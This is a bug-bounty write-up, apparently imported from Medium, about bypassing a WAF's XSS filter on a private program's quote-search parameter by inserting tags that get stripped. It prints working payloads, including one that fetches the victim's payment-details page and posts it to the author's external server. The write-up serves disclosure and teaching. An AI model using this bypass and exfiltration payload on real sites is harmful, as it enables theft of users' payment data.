---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-17_bypassing-xss-filter-and-stealing-user-payment-data_2.md
original_filename: 2019-06-17_bypassing-xss-filter-and-stealing-user-payment-data_2.md
title: Bypassing XSS filter and Stealing User Payment Data
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 9ecadbcb59d29285e429fdbadf2b3ee6e542f829fe0bbe76dbd5dc3ee9b36667
text_sha256: e21d0843d155788b27499a5af9e691fd9f9036511d778eb94b32c9cd9157c3ee
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing XSS filter and Stealing User Payment Data

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-17_bypassing-xss-filter-and-stealing-user-payment-data_2.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `9ecadbcb59d29285e429fdbadf2b3ee6e542f829fe0bbe76dbd5dc3ee9b36667`
- Text SHA256: `e21d0843d155788b27499a5af9e691fd9f9036511d778eb94b32c9cd9157c3ee`


## Content

---
title: "Bypassing XSS filter and Stealing User Payment Data"
url: "https://medium.com/@osamaavvan/bypassing-xss-filter-and-stealing-user-credit-card-data-100f247ed5eb"
authors: ["Osama Avvan (@osamaavvan)"]
bugs: ["XSS"]
publication_date: "2019-06-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5207
scraped_via: "browseros"
---

# Bypassing XSS filter and Stealing User Payment Data

Bypassing XSS filter and Stealing User Payment Data
Osama Avvan
Follow
2 min read
·
Jun 17, 2019

263

2

So here is another writeup about how I bypassed XSS filter and created a payload to get user credit card data. It was a private program on bugcrowd, let’s just say it was named Redact.

Here is the URL https://www.redact.com/us/en/my-account/quotes?searchCriteria=QuoteID&amountOperator=equal&searchValue=XSS The parameter searchValue was reflected inside an input feild.

So by putting an “ I was able to break out of the input field, after that, I tried the most basic payload “><script>alert(1)</script>, but unfortunately my request was blocked by WAF. so I tried another payload “onmouseover=alert(1) and again my request was blocked by WAF.

After some playing around, I found out that anything between <> was being removed, so if type something like this “o<x>nmouseover=alert<x>1//

<x> will be removed leaving it only with “onmouseover=alert(1)// and finally i was able to pop up a XSS.

Now there was a page which allows the user to view their payment Data https://www.redact.com/us/en/smbpro/my-account/payment-details, so I thought it would be a good idea to include this in my report that how I can get users credit card data with this XSS.

Get Osama Avvan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So the Payload for stealing user credit card data was this “o<x>nmouseover=$.get<x>(‘https://www.redact.com/us/en/my-account/payment-details',function<x>(res){$.post<x>('https://osamaavvan.000webhostapp.com/r.php',{res})})//

As the page was using jQuery, I requested the whole payment data page with $.get() and posted the page content to my server with $.post(), so now with this payload, I was able to get users payment data:

https://www.redact.com/us/en/my-account/quotes?searchCriteria=QuoteID&amountOperator=equal&searchValue=“o<x>nmouseover=$.get<x>(‘https://www.redact.com/us/en/my-account/payment-details',function<x>(res){$.post<x>('https://osamaavvan.000webhostapp.com/r.php',{res})})//

Press enter or click to view image in full size

But unfortunately, my report got duplicate.

Press enter or click to view image in full size

Thank You for Reading.
